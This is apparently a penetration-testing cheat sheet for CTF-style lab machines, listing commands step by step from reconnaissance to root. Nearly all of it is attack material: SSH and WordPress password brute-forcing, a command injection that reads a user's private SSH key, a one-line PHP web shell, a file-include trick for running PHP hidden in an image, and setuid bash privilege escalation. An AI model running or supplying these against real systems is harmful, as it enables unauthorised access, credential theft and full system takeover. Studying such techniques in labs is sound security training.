#Reconnaissance

sudo nmap -sC -sV -v -p- 10.10.10.10 –min-rate 10000

dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10

#Getting Credentials

hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V

mysql -h 10.10.70.250 -u root -p

grep -r 'looking_for_this' /in/this/directory

wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt

;cat /home/user/.ssh/id_rsa to get the SSH key

ftp 10.10.10.10 

touch id.rsa 

ssh -i id.rsa user@10.10.10.10

#Getting Remote Command Execution

<?php echo passthru($_GET['cmd']); ?>

#Privledge Escalation

sudo -l
chmod +s /bin/bash 
cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell


below to find SUID binaries
find / -perm -4000 2>/dev/null 

https://www.revshells.com/

PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes

website.com/index.php?pg=/uploads/image.lol?cmd=ls

Could also use a straight PHP reverse shell payload

#Using John The Ripper

To crack a password-protected zip file, first convert it into a hash that John can read
zip2john file-to-crack.zip > hashed.john
And then call John on it
john -w=/usr/share/wordlists/rockyou.txt hashed.john

To crack a SSH key
ssh2john encrypted-id.rsa > id.rsa.john
john -w=/usr/share/wordlists/rockyou.txt id.rsa.john

#Other
bash -i to make the improvised root shell look nice

#abusing NFS
sudo showmount -e 10.10.10.10
mkdir mnt
sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock

